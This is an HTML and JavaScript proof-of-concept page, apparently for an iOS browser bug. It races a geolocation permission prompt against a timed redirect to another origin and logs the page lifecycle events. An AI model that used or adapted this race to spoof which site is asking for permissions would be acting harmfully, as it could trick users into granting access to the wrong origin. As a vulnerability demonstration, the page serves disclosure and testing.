<!doctype html>
<html>
<body style="background:#111;color:#fff;text-align:center;font-family:sans-serif">

<h2>iOS UI Persistence / Origin Desync PoC</h2>
<p>Tap Start → permission race → redirect</p>

<button id="start" style="font-size:22px;padding:14px 26px">Start</button>

<pre id="log" style="margin:20px auto;width:85%;background:#000;padding:14px;border-radius:8px;text-align:left"></pre>

<script>
const log = m => out.textContent += m + "\n";
const out = document.getElementById("log");

log("Origin: " + location.origin);
log("--------------------------------");

start.onclick = async () => {
  log("[STEP] User activation");

  // 1️⃣ Start permission request
  try {
    navigator.geolocation.getCurrentPosition(
      () => log("[INFO] Geo success"),
      () => log("[INFO] Geo denied")
    );
    log("[STEP] Geolocation requested");
  } catch {}

  // 2️⃣ Lifecycle / navigation race
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        log("[RACE] Navigating to https://google.com:9090");
        location.href = "https://google.com:9090";
      }, 80);
    });
  });
};

// Observe lifecycle
addEventListener("pagehide", () => log("[EVENT] pagehide"));
addEventListener("visibilitychange", () =>
  log("[EVENT] visibility=" + document.visibilityState)
);
</script>

</body>
</html>
